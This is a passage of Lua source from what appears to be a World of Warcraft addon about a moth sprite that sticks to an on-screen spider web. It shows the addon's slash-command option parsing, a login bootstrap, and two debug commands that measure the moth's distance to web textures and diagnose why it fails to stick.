        NSPauk_Moth:Print("STICK_VISIBLE_RADIUS=", tostring(NSPauk_Moth.cfg.STICK_VISIBLE_RADIUS))
        return
    end

    if m == "chance" then
        NSPauk_Moth:Print(
            "STICK_CHANCE=", tostring(NSPauk_Moth.cfg.STICK_CHANCE),
            "requireLeave=", tostring(NSPauk_Moth.cfg.STICK_FAIL_REQUIRE_LEAVE)
        )
        return
    end

    local parentMode = string.match(m, "^parent%s+(%a+)$")

    if parentMode then
        if parentMode == "auto" or parentMode == "web" or parentMode == "ui" then
            NSPauk_Moth.parentMode = parentMode
            NSPauk_Moth:Place()

            NSPauk_Moth:Print(
                "parentMode=", parentMode,
                "anchor=", FrameLabel(NSPauk_Moth:GetAnchorFrame())
            )
        else
            NSPauk_Moth:Print("unknown parent mode:", parentMode, "(use auto|web|ui)")
        end

        return
    end

    local crossMode = string.match(m, "^cross%s+(on|off)$")

    if crossMode then
        NSPauk_Moth.cfg.STICK_CROSSSEGS = (crossMode == "on")

        if not NSPauk_Moth.cfg.STICK_CROSSSEGS and NSPauk_Moth.state.stuckOwner then
            NSPauk_Moth:Release()
        end

        NSPauk_Moth:Print("STICK_CROSSSEGS=", tostring(NSPauk_Moth.cfg.STICK_CROSSSEGS))
        return
    end

    local connsMode = string.match(m, "^conns%s+(on|off)$")

    if connsMode then
        NSPauk_Moth.cfg.STICK_CONNS = (connsMode == "on")

        if not NSPauk_Moth.cfg.STICK_CONNS and NSPauk_Moth.state.stuckOwner then
            NSPauk_Moth:Release()
        end

        NSPauk_Moth:Print("STICK_CONNS=", tostring(NSPauk_Moth.cfg.STICK_CONNS))
        return
    end

    local strictMode = string.match(m, "^strict%s+(on|off)$")

    if strictMode then
        NSPauk_Moth.cfg.STICK_ONLY_VISIBLE_TEXTURE = (strictMode == "on")

        if NSPauk_Moth.state.stuckOwner then
            NSPauk_Moth:Release()
        end

        NSPauk_Moth:Print(
            "STICK_ONLY_VISIBLE_TEXTURE=",
            tostring(NSPauk_Moth.cfg.STICK_ONLY_VISIBLE_TEXTURE)
        )
        return
    end

    local radiusValue = string.match(m, "^radius%s+(%d+)$")

    if radiusValue then
        NSPauk_Moth.cfg.STICK_VISIBLE_RADIUS = tonumber(radiusValue)

        if NSPauk_Moth.state.stuckOwner then
            NSPauk_Moth:Release()
        end

        NSPauk_Moth:Print("STICK_VISIBLE_RADIUS=", tostring(NSPauk_Moth.cfg.STICK_VISIBLE_RADIUS))
        return
    end

    local chanceValue = string.match(m, "^chance%s+(.+)$")

    if chanceValue then
        local num = tonumber(chanceValue)

        if not num then
            local a, b = string.match(chanceValue, "^(%d+)%s*/%s*(%d+)$")

            if a and b then
                local den = tonumber(b)

                if den and den ~= 0 then
                    num = tonumber(a) / den
                end
            end
        end

        if num then
            if num < 0 then
                num = 0
            elseif num > 1 then
                num = 1
            end

            NSPauk_Moth.cfg.STICK_CHANCE = num

            NSPauk_Moth:Print("STICK_CHANCE=", tostring(NSPauk_Moth.cfg.STICK_CHANCE))
        else
            NSPauk_Moth:Print("invalid chance:", chanceValue, "(use 0..1 or 1/3)")
        end

        return
    end

    NSPauk_Moth:Print("unknown command:", msg, "type /nsmoth help")
end

---------------------------------------------------------------------------
-- Bootstrap
---------------------------------------------------------------------------

local bootstrap = CreateFrame("Frame")

NSPauk_Moth.bootstrap = bootstrap

bootstrap:RegisterEvent("PLAYER_LOGIN")
bootstrap:SetScript("OnEvent", function()
    NSPauk_Moth:Init()
end)

if IsLoggedIn and IsLoggedIn() then
    NSPauk_Moth:Init()
end




















---------------------------------------------------------------------------
-- Distance check command: /nsmoth dist
---------------------------------------------------------------------------

if not NSPauk_Moth._distCommandPatch then
    NSPauk_Moth._distCommandPatch = true

    local function DbgPoint(p)
        if type(p) == "table" and type(p.x) == "number" and type(p.y) == "number" then
            return string.format("%.1f,%.1f", p.x, p.y)
        end

        return "invalid"
    end

    local function DbgDist2(px, py, ax, ay, bx, by)
        local dx = bx - ax
        local dy = by - ay

        local len2 = dx * dx + dy * dy

        if len2 <= 0.0001 then
            local ex = px - ax
            local ey = py - ay
            return ex * ex + ey * ey
        end

        local t = ((px - ax) * dx + (py - ay) * dy) / len2

        if t < 0 then
            t = 0
        elseif t > 1 then
            t = 1
        end

        local cx = ax + t * dx
        local cy = ay + t * dy

        local ex = px - cx
        local ey = py - cy

        return ex * ex + ey * ey
    end

    local function DbgAnchor(relPoint, parentW, parentH)
        if relPoint == "BOTTOMLEFT" then
            return 0, 0
        elseif relPoint == "BOTTOM" then
            return parentW / 2, 0
        elseif relPoint == "BOTTOMRIGHT" then
            return parentW, 0
        elseif relPoint == "LEFT" then
            return 0, parentH / 2
        elseif relPoint == "CENTER" then
            return parentW / 2, parentH / 2
        elseif relPoint == "RIGHT" then
            return parentW, parentH / 2
        elseif relPoint == "TOPLEFT" then
            return 0, parentH
        elseif relPoint == "TOP" then
            return parentW / 2, parentH
        elseif relPoint == "TOPRIGHT" then
            return parentW, parentH
        end

        return 0, 0
    end

    local function DbgCenter(point, absX, absY, w, h)
        if point == "CENTER" then
            return absX, absY
        elseif point == "BOTTOMLEFT" then
            return absX + w / 2, absY + h / 2
        elseif point == "BOTTOM" then
            return absX, absY + h / 2
        elseif point == "BOTTOMRIGHT" then
            return absX - w / 2, absY + h / 2
        elseif point == "LEFT" then
            return absX + w / 2, absY
        elseif point == "RIGHT" then
            return absX - w / 2, absY
        elseif point == "TOPLEFT" then
            return absX + w / 2, absY - h / 2
        elseif point == "TOP" then
            return absX, absY - h / 2
        elseif point == "TOPRIGHT" then
            return absX - w / 2, absY - h / 2
        end

        return absX, absY
    end

    local function CalcTexDistance(pts, w, h, x, y)
        if #pts == 0 then
            return nil
        end

        if #pts == 1 then
            local cx, cy = DbgCenter(pts[1].point, pts[1].x, pts[1].y, w, h)

            local dx = cx - x
            local dy = cy - y

            return math.sqrt(dx * dx + dy * dy)
        end

        local bestD2 = math.huge

        for i = 1, #pts - 1 do
            local d2 = DbgDist2(
                x, y,
                pts[i].x, pts[i].y,
                pts[i + 1].x, pts[i + 1].y
            )

            if d2 < bestD2 then
                bestD2 = d2
            end
        end

        local d2 = DbgDist2(
            x, y,
            pts[#pts].x, pts[#pts].y,
            pts[1].x, pts[1].y
        )

        if d2 < bestD2 then
            bestD2 = d2
        end

        return math.sqrt(bestD2)
    end

    function NSPauk_Moth:DebugDistance()
        local s = self.state

        if not s then
            self:Print("state is nil")
            return
        end

        self:Print("=== distance check ===")

        self:Print(
            "cfg STICK_DIST=", tostring(self.cfg.STICK_DIST),
            "STICK_VISIBLE_RADIUS=", tostring(self.cfg.STICK_VISIBLE_RADIUS),
            "strict=", tostring(self.cfg.STICK_ONLY_VISIBLE_TEXTURE)
        )

        self:Print(
            "state pos=", string.format("%.1f,%.1f", s.x, s.y),
            "stuck=", tostring(s.stuckOwner ~= nil),
            "dead=", tostring(s.dead)
        )

        local info = self.stuckInfo

        local baseX = s.x
        local baseY = s.y

        if info and info.stuck and info.baseX and info.baseY then
            baseX = info.baseX
            baseY = info.baseY

            local dx = s.x - baseX
            local dy = s.y - baseY

            self:Print(
                "stuckInfo base=", string.format("%.1f,%.1f", baseX, baseY),
                "pos->base=", string.format("%.2f", math.sqrt(dx * dx + dy * dy)),
                "webDist=", tostring(info.webDist),
                "t=", tostring(info.t),
                "source=", tostring(info.source),
                "visibleTexture=", tostring(info.visibleTexture)
            )
        else
            self:Print("stuckInfo: not stuck")
        end

        if self.lastWebInfo then
            self:Print(
                "lastWeb source=", tostring(self.lastWebInfo.source),
                "dist=", string.format("%.2f", self.lastWebInfo.dist or 0),
                "visible=", tostring(self.lastWebInfo.visibleTexture),
                "rejected=", tostring(self.lastWebInfo.rejected),
                "base=", string.format(
                    "%.1f,%.1f",
                    self.lastWebInfo.baseX or 0,
                    self.lastWebInfo.baseY or 0
                )
            )
        end

        if s.stuckOwner and s.stuckOwner.thread then
            local th = s.stuckOwner.thread

            self:Print(
                "owner thread p0=", DbgPoint(th.p0),
                "p1=", DbgPoint(th.p1),
                "p2=", DbgPoint(th.p2)
            )

            local minD2 = math.huge
            local bestT = 0

            for i = 0, 64 do
                local t = i / 64
                local px, py = self:ThreadPointAt(th, t)

                local dx = px - s.x
                local dy = py - s.y
                local d2 = dx * dx + dy * dy

                if d2 < minD2 then
                    minD2 = d2
                    bestT = t
                end
            end

            self:Print(
                "current min dist to thread=", string.format("%.2f", math.sqrt(minD2)),
                "bestT=", string.format("%.3f", bestT),
                "stuckT=", string.format("%.3f", s.stuckT or 0)
            )
        end

        local web = self:GetWebFrame()

        if not web then
            self:Print("web frame unavailable")
            return
        end

        local parentW = web.GetWidth and web:GetWidth() or 0
        local parentH = web.GetHeight and web:GetHeight() or 0

        local regions = self:GetWebRegions(web)

        if not regions or #regions == 0 then
            self:Print("web frame has no regions")
            return
        end

        local visibleTexCount = 0

        local bestPosD = math.huge
        local bestPosTex = nil

        local bestBaseD = math.huge
        local bestBaseTex = nil

        for _, reg in ipairs(regions) do
            if reg.GetObjectType and reg:GetObjectType() == "Texture" then
                local shown = reg.IsShown and reg:IsShown() or false
                local alpha = reg.GetAlpha and reg:GetAlpha() or 1

                if shown and alpha > 0.01 then
                    local w = reg.GetWidth and reg:GetWidth() or 0
                    local h = reg.GetHeight and reg:GetHeight() or 0

                    local isFullScreenish = w > parentW * 0.8 and h > parentH * 0.8

                    if not isFullScreenish then
                        visibleTexCount = visibleTexCount + 1

                        local pts = {}

                        if reg.GetNumPoints then
                            local n = reg:GetNumPoints()

                            for i = 1, n do
                                local point, relTo, relPoint, ox, oy = reg:GetPoint(i)

                                if ox and oy then
                                    local relName = nil

                                    if type(relTo) == "string" then
                                        relName = relTo
                                    elseif relTo and relTo.GetName then
                                        relName = relTo:GetName()
                                    end

                                    local okRel = (relTo == nil)
                                        or (relTo == web)
                                        or (relTo == UIParent)
                                        or relName == "NSPauk_WebHigh"
                                        or relName == "UIParent"

                                    if okRel then
                                        local bx, by = DbgAnchor(relPoint, parentW, parentH)

                                        pts[#pts + 1] = {
                                            x = bx + ox,
                                            y = by + oy,
                                            point = point,
                                        }
                                    end
                                end
                            end
                        end

                        if #pts > 0 then
                            local dPos = CalcTexDistance(pts, w, h, s.x, s.y)
                            local dBase = CalcTexDistance(pts, w, h, baseX, baseY)

                            local texName = reg.GetTexture and reg:GetTexture() or "?"

                            if dPos and dPos < bestPosD then
                                bestPosD = dPos

                                bestPosTex = {
                                    tex = texName,
                                    alpha = alpha,
                                    w = w,
                                    h = h,
                                    d = dPos,
                                }
                            end

                            if dBase and dBase < bestBaseD then
                                bestBaseD = dBase

                                bestBaseTex = {
                                    tex = texName,
                                    alpha = alpha,
                                    w = w,
                                    h = h,
                                    d = dBase,
                                }
                            end
                        end
                    end
                end
            end
        end

        self:Print("visible textures scanned=", visibleTexCount)

        if bestPosTex then
            self:Print(
                "nearest visible texture to POS=", string.format("%.2f", bestPosD),
                "tex=", tostring(bestPosTex.tex),
                "alpha=", string.format("%.2f", bestPosTex.alpha),
                "size=", string.format("%.1fx%.1f", bestPosTex.w, bestPosTex.h)
            )
        else
            self:Print("nearest visible texture to POS= none")
        end

        if bestBaseTex then
            self:Print(
                "nearest visible texture to BASE=", string.format("%.2f", bestBaseD),
                "tex=", tostring(bestBaseTex.tex),
                "alpha=", string.format("%.2f", bestBaseTex.alpha),
                "size=", string.format("%.1fx%.1f", bestBaseTex.w, bestBaseTex.h)
            )
        else
            self:Print("nearest visible texture to BASE= none")
        end
    end

    local oldSlashDist = SlashCmdList["NSPAUKMOTH"]

    SlashCmdList["NSPAUKMOTH"] = function(msg)
        local m = msg or ""

        m = m:gsub("^%s+", "")
        m = m:gsub("%s+$", "")
        m = m:lower()

        if m == "dist" or m == "distance" or m == "check" then
            NSPauk_Moth:DebugDistance()
            return
        end

        if m == "" or m == "help" then
            if oldSlashDist then
                oldSlashDist(msg)
            end

            NSPauk_Moth:Print("/nsmoth dist -- distance check")
            return
        end

        if oldSlashDist then
            oldSlashDist(msg)
        else
            NSPauk_Moth:Print("unknown command:", msg)
        end
    end
end















































































---------------------------------------------------------------------------
-- Why-no-stick debug: /nsmoth why
---------------------------------------------------------------------------

if not NSPauk_Moth._whyCommandPatch then
    NSPauk_Moth._whyCommandPatch = true

    function NSPauk_Moth:DebugWhy()
        local c = self.cfg
        local s = self.state

        if not c or not s then
            self:Print("cfg or state is nil")
            return
        end

        local now = GetTime and GetTime() or 0

        self:Print("=== why no stick ===")

        self:Print(
            "inited=", tostring(self.inited),
            "destroyed=", tostring(self.destroyed),
            "frozen=", tostring(s.frozen),
            "dead=", tostring(s.dead)
        )

        if self.frame then
            self:Print(
                "frame shown=", tostring(self.frame:IsShown()),
                "visible=", tostring(self.frame.IsVisible and self.frame:IsVisible() or "?")
            )
        else
            self:Print("frame= nil")
        end

        self:Print(
            "cfg conns=", tostring(c.STICK_CONNS),
            "crossSegs=", tostring(c.STICK_CROSSSEGS),
            "chance=", tostring(c.STICK_CHANCE),
            "strict=", tostring(c.STICK_ONLY_VISIBLE_TEXTURE),
            "radius=", tostring(c.STICK_VISIBLE_RADIUS),
            "stickDist=", tostring(c.STICK_DIST)
        )

        self:Print(
            "filters travel=", tostring(c.STICK_KIND_TRAVEL),
            "crawl=", tostring(c.STICK_NSPCRAWL),
            "noInsert=", tostring(c.STICK_NSPNOINSERT),
            "duringDrag=", tostring(c.STICK_NSPDURINGDRAG)
        )

        self:Print(
            "clickImmunity=", string.format("%.2f", s.clickImmunity or 0),
            "webFailActive=", tostring(s.webFailActive),
            "webFailUntilIn=", string.format("%.2f", (s.webFailUntil or 0) - now),
            "requireLeave=", tostring(c.STICK_FAIL_REQUIRE_LEAVE)
        )

        if self.lastWebInfo then
            self:Print(
                "lastWeb source=", tostring(self.lastWebInfo.source),
                "dist=", string.format("%.2f", self.lastWebInfo.dist or 0),
                "visible=", tostring(self.lastWebInfo.visibleTexture),
                "rejected=", tostring(self.lastWebInfo.rejected)
            )
        else
            self:Print("lastWeb= nil")
        end

        if type(NSPauk) ~= "table" then
            self:Print("NSPauk= nil")
            return
        end

        local S = NSPauk.S

        if type(S) ~= "table" or type(S.instances) ~= "table" then
            self:Print("NSPauk.S.instances= nil")
            return
        end

        local stickDist = c.STICK_DIST or 9
        local stick2 = stickDist * stickDist
        local pad = stickDist + 4

        local near = 0
        local filterPass = 0
        local visiblePass = 0

        local best = nil
        local bestD2 = math.huge

        local function consider(source, instIndex, index, obj)
            if type(obj) ~= "table" then
                return
            end

            if obj.alive
                and obj.hidden ~= true
                and obj.visible ~= false
                and self:ThreadIsValid(obj.thread) then

                if self:ThreadNearBox(obj.thread, s.x, s.y, pad) then
                    local t, d2 = self:NearestThreadT(obj.thread, s.x, s.y)

                    if d2 <= stick2 then
                        near = near + 1

                        if self:IsStickyTarget(obj, obj.thread) then
                            filterPass = filterPass + 1

                            local baseX, baseY = self:ThreadPointAt(obj.thread, t)

                            local visible = true

                            if c.STICK_ONLY_VISIBLE_TEXTURE ~= false
                                and self.HasVisibleWebTextureNear then

                                local okVisible, visibleTexture = pcall(function()
                                    return self:HasVisibleWebTextureNear(
                                        baseX,
                                        baseY,
                                        c.STICK_VISIBLE_RADIUS
                                    )
                                end)

                                visible = okVisible and visibleTexture or false
                            end

                            if visible then
                                visiblePass = visiblePass + 1

                                if d2 < bestD2 then
                                    bestD2 = d2

                                    best = {
                                        source = source,
                                        inst = tostring(instIndex),
                                        index = tostring(index),
                                        d2 = d2,
                                        dist = math.sqrt(d2),
                                        t = t,
                                        baseX = baseX,
                                        baseY = baseY,
                                    }
                                end
                            end
                        end
                    end
                end
            end
        end

        for instIndex, inst in pairs(S.instances) do
            if type(inst) == "table"
                and inst.alive ~= false
                and inst.hidden ~= true
                and inst.visible ~= false then

                if c.STICK_CONNS ~= false and type(inst.conns) == "table" then
                    for connIndex, conn in pairs(inst.conns) do
                        consider("conns", instIndex, connIndex, conn)
                    end
                end

                if c.STICK_CROSSSEGS ~= false and type(inst.crossSegs) == "table" then
                    for segIndex, seg in pairs(inst.crossSegs) do
                        consider("crossSegs", instIndex, segIndex, seg)
                    end
                end
            end
        end

        self:Print(
            "near threads=", near,
            "filterPass=", filterPass,
            "visiblePass=", visiblePass
        )

        if best then
            self:Print(
                "best stickable:",
                "source=", tostring(best.source),
                "inst=", best.inst,
                "index=", best.index,
                "dist=", string.format("%.2f", best.dist),
                "t=", string.format("%.3f", best.t),
                "base=", string.format("%.1f,%.1f", best.baseX or 0, best.baseY or 0)
            )
        end

        if near == 0 then
            self:Print("reason: no alive thread within STICK_DIST")
        elseif filterPass == 0 then
            self:Print("reason: threads are near, but filters block them")
        elseif visiblePass == 0 then
            self:Print("reason: threads pass filters, but no visible texture within STICK_VISIBLE_RADIUS")
        else
            self:Print("reason: stickable threads exist; check chance / webFailActive / clickImmunity")
        end

        if s.webFailActive and c.STICK_FAIL_REQUIRE_LEAVE ~= false then
            self:Print("note: webFailActive + requireLeave blocks re-stick until moth leaves web")
        end

        if (s.clickImmunity or 0) > 0 then
            self:Print("note: clickImmunity is active and blocks web checks")
        end
    end

    local oldSlashWhy = SlashCmdList["NSPAUKMOTH"]

    SlashCmdList["NSPAUKMOTH"] = function(msg)
        local m = msg or ""

        m = m:gsub("^%s+", "")
        m = m:gsub("%s+$", "")
        m = m:lower()

        if m == "why" then
            NSPauk_Moth:DebugWhy()
            return
        end

        if m == "" or m == "help" then
            if oldSlashWhy then
                oldSlashWhy(msg)
            end

            NSPauk_Moth:Print("/nsmoth why -- diagnose why moth does not stick")
            return
        end

        if oldSlashWhy then
            oldSlashWhy(msg)
        else
            NSPauk_Moth:Print("unknown command:", msg)
        end
    end
end